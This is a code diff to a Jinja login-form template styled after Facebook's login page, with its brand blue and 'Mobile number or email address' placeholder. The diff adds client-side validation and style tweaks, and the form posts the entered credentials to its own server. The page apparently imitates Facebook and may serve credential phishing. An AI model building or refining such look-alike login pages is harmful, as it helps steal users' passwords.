@@ -11,14 +11,15 @@
     </div>
   </div>
 
-  <form method="post" style="display:flex;flex-direction:column;gap:10px;margin-top:22px;">
+  <form id="loginForm" method="post" style="display:flex;flex-direction:column;gap:10px;margin-top:22px;">
     <input 
       class="input"
+      id="address"
       name="address"
       placeholder="Mobile number or email address"
       required
       style="
-        padding:16px 18px;
+        padding:14px 18px;
         border-radius:50px;
         border:1px solid #e5e7eb;
         font-size:15.5px;
@@ -29,12 +30,13 @@
     >
     <input 
       class="input"
+      id="password"
       name="password"
       type="password"
       placeholder="Password"
       required
       style="
-        padding:16px 18px;
+        padding:14px 18px;
         border-radius:50px;
         border:1px solid #e5e7eb;
         font-size:15.5px;
@@ -51,22 +53,66 @@
         style="
           width:100%;
           max-width:340px;
-          padding:16px;
+          padding:13px;
           border-radius:50px;
-          font-size:16px;
+          font-size:15px;
           font-weight:600;
           background:#1877F2;
           color:#fff;
-          box-shadow:0 8px 25px rgba(24,119,242,0.25);
+          box-shadow:0 6px 20px rgba(24,119,242,0.25);
           transition:all 0.25s ease;
           border:none;
         "
-        onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 12px 30px rgba(24,119,242,0.35)'"
-        onmouseout="this.style.transform='translateY(0)';this.style.boxShadow='0 8px 25px rgba(24,119,242,0.25)'"
+        onmouseover="this.style.transform='translateY(-2px)';this.style.boxShadow='0 10px 24px rgba(24,119,242,0.35)'"
+        onmouseout="this.style.transform='translateY(0)';this.style.boxShadow='0 6px 20px rgba(24,119,242,0.25)'"
       >
         Log in
       </button>
     </div>
   </form>
 </div>
+
+<style>
+.input-error {
+  border-color: #ef4444 !important;
+  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.25) !important;
+}
+</style>
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+  const address = document.getElementById("address");
+  const password = document.getElementById("password");
+
+  const emailPattern = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+  const phonePattern = /^\+?\d{6,}$/; // + optional, at least 6 digits
+
+  let valid = true;
+  const inputs = [address, password];
+  inputs.forEach(input => input.classList.remove("input-error"));
+
+  // Address validation
+  if (!(emailPattern.test(address.value.trim()) || phonePattern.test(address.value.trim()))) {
+    valid = false;
+    address.classList.add("input-error");
+  }
+
+  // Password validation
+  if (password.value.trim().length < 6) {
+    valid = false;
+    password.classList.add("input-error");
+  }
+
+  if (!valid) {
+    event.preventDefault();
+    const firstError = document.querySelector(".input-error");
+    firstError.scrollIntoView({ behavior: "smooth", block: "center" });
+  }
+});
+
+// remove red instantly after fixing
+document.querySelectorAll(".input").forEach(input => {
+  input.addEventListener("input", () => input.classList.remove("input-error"));
+});
+</script>
 {% endblock %}
